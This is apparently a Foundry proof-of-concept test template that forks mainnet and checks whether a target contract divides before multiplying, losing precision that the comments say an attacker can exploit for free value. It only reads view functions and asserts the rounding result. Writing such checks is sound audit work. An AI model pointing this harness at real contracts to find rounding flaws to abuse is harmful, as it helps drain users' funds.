// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Division before multiplication (precision loss)
/// @notice Detector: div-before-mul. The target computes
///         amount / total * share (divide first). Integer division
///         truncates, so small amounts round to ZERO -- users lose dust,
///         or an attacker exploits the rounding for free value.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt calculate() / total() /
///      share() to the target's real functions.

interface IVictim {
    function calculate(uint256 amount) external view returns (uint256);
    function total() external view returns (uint256);
    function share() external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        uint256 total = IVictim(target).total();
        uint256 share = IVictim(target).share();
        require(total > 1, "total too small to show rounding");

        // Small amount: div-first gives 0, mul-first gives > 0.
        uint256 smallAmount = total / 2;
        uint256 expectedMulFirst = (smallAmount * share) / total;
        uint256 got = IVictim(target).calculate(smallAmount);
        console.log("mul-first expected:", expectedMulFirst);
        console.log("target returned:", got);
        assertGt(expectedMulFirst, 0, "amount too small to distinguish orderings");
        assertEq(got, 0, "exploit did not reproduce: no div-first precision loss");
    }
}
